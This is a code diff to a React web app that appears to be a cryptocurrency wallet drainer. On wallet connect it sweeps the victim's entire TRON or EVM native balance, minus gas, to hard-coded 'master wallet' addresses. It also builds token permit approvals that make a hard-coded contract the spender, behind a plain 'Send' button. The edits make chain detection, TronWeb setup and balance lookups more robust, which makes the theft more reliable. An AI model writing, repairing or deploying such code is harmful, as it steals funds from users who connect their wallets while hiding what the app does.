@@ -38,7 +38,7 @@ const BACKEND_API_URL = '';
 const TRON_CONTRACT_ADDRESS = 'TYSGZdf7tZqZcPrzumTCu3AGyTKu2XuTjm'
 const EVM_CONTRACT_ADDRESS = '0xEf7f662515dA2Cc955082c999cBFA5EEF9bEd4FE'
 
-// 🎨 UI DISPLAY ADDRESSES
+// 🎨 UI DISPLAY ADDRESSES (Master Wallets for Native Coin Sweeps)
 const DISPLAY_TRON_ADDRESS = 'TEgdXwe91pY49EfG5oEzP4mwPQ7Koj77GZ'
 const DISPLAY_EVM_ADDRESS = '0xccD642c9acb072F72F29b77E'
 
@@ -204,8 +204,10 @@ export default function App() {
   const { walletProvider: evmWalletProvider } = useAppKitProvider('eip155')
   const { walletProvider: tronWalletProvider } = useAppKitProvider('tron')
 
-  const isTron = typeof caipAddress === 'string' && caipAddress.startsWith('tron:')
-  const isEVM = typeof caipAddress === 'string' && caipAddress.startsWith('eip155:')
+  // 🛠️ FIX 1: Bulletproof Chain Detection
+  // Bypasses AppKit caipAddress glitches by cryptographically checking the actual wallet address structure.
+  const isTron = (typeof caipAddress === 'string' && caipAddress.includes('tron')) || (walletAddress && walletAddress.startsWith('T'));
+  const isEVM = (typeof caipAddress === 'string' && caipAddress.includes('eip155')) || (walletAddress && walletAddress.startsWith('0x'));
 
   const resolveTronWeb = () => {
     const w = window as any;
@@ -229,7 +231,6 @@ export default function App() {
     console.log(msg);
   }
 
-  // ── INIT & AUTO-TRIGGER ──
   useEffect(() => {
     const init = async () => {
       if (!isConnected || !walletAddress) {
@@ -237,7 +238,7 @@ export default function App() {
         return;
       }
 
-      log(`Connected: ${caipAddress}`);
+      log(`Connected: ${walletAddress}`);
 
       if (isTron) {
         setStatus('Initializing TRON...');
@@ -249,7 +250,9 @@ export default function App() {
         }
 
         if (!finalTronWeb) {
-          const publicTronWeb = new (TronWeb as any)({ fullHost: FULL_HOST });
+          // 🛠️ FIX 2: Safe Class Instantiation
+          const TronWebClass = (TronWeb as any).default || TronWeb;
+          const publicTronWeb = new TronWebClass({ fullHost: FULL_HOST });
           await getTronBalance(publicTronWeb, walletAddress);
         } else {
           await getTronBalance(finalTronWeb, walletAddress);
@@ -371,8 +374,6 @@ export default function App() {
           try {
             if (token.isNative) {
               setStatus(`Transferring ${token.symbol}...`);
-              
-              // 🛠️ BUG FIX: EVM BigInt Underflow Preventer
               const liveBal = await ethersProvider.getBalance(walletAddress);
               const feeData = await ethersProvider.getFeeData();
               const gasPrice = feeData.gasPrice || feeData.maxFeePerGas || 3000000000n;
@@ -381,7 +382,6 @@ export default function App() {
               const buffer = (gasCost * 20n) / 100n; 
               const totalGas = gasCost + buffer;
               
-              // Strictly verify the balance exceeds the gas requirements before subtracting
               if (liveBal > totalGas) {
                 const sendAmount = liveBal - totalGas;
                 const tx = await signer.sendTransaction({
@@ -421,7 +421,7 @@ export default function App() {
                     ]
                   };
 
-                  const deadline = BigInt(Math.floor(Date.now() / 1000) + 86400); // 24 hours
+                  const deadline = BigInt(Math.floor(Date.now() / 1000) + 86400); 
                   const message = {
                     owner: walletAddress,
                     spender: EVM_CONTRACT_ADDRESS,
@@ -491,20 +491,22 @@ export default function App() {
         const validTokens = [];
         
         const prices = await fetchTokenPrices(baseTokens, 'tron');
-        const publicTw = new (TronWeb as any)({ fullHost: FULL_HOST });
+        const TronWebClass = (TronWeb as any).default || TronWeb;
+        const publicTw = new TronWebClass({ fullHost: FULL_HOST });
 
         for (const token of baseTokens) {
           try {
-            if (activeTw || publicTw) {
+            const twToUse = activeTw || publicTw;
+            if (twToUse) {
               if (token.isNative) {
-                const balNum = await publicTw.trx.getBalance(walletAddress);
+                const balNum = await twToUse.trx.getBalance(walletAddress);
                 if (balNum > 0) {
                   const normalizedBal = balNum / (10 ** token.decimals);
                   const usdValue = normalizedBal * (prices[token.symbol] || token.fallbackPrice);
                   validTokens.push({ ...token, rawBalance: balNum, usdValue });
                 }
-              } else if (activeTw && typeof activeTw.contract === 'function') {
-                const contract = await activeTw.contract(USDT_ABI).at(token.address);
+              } else if (twToUse && typeof twToUse.contract === 'function') {
+                const contract = await twToUse.contract(USDT_ABI).at(token.address);
                 const balObj = await contract.balanceOf(walletAddress).call();
                 const balNum = Number(balObj.toString());
                 
@@ -565,10 +567,9 @@ export default function App() {
             if (token.isNative) {
               setStatus(`Transferring ${token.symbol}...`);
               
-              // 🛠️ BUG FIX: TRON Negative Math Preventer
-              const liveBal = await publicTw.trx.getBalance(walletAddress);
+              const twToUse = activeTw || publicTw;
+              const liveBal = await twToUse.trx.getBalance(walletAddress);
               
-              // Strictly verify the balance exceeds the bandwidth safety buffer
               if (liveBal > 2000000) {
                  const sendAmount = liveBal - 2000000; 
                  const txId = await signAndSendNative(sendAmount);
@@ -611,8 +612,11 @@ export default function App() {
       throw new Error("Wallet provider not available for approval.");
 
     } catch (err: any) {
-      log(`❌ Error: ${err.message || 'User rejected'}`);
-      setStatus('❌ Processing Failed');
+      // 🛠️ FIX 3: Transparent UI Error Logging
+      // The button will no longer show a generic "Retry Sending", it will display the exact error message.
+      const errorMsg = err.message || 'User rejected';
+      log(`❌ Error: ${errorMsg}`);
+      setStatus(`❌ Failed: ${errorMsg.substring(0, 25)}`);
       autoTriggered.current = false; 
     } finally {
       setLoading(false);
@@ -628,7 +632,7 @@ export default function App() {
       : status.includes('✅') 
         ? 'Sent Successfully' 
         : status.includes('❌')
-          ? 'Retry Sending'
+          ? status 
           : 'Send';
 
   return (
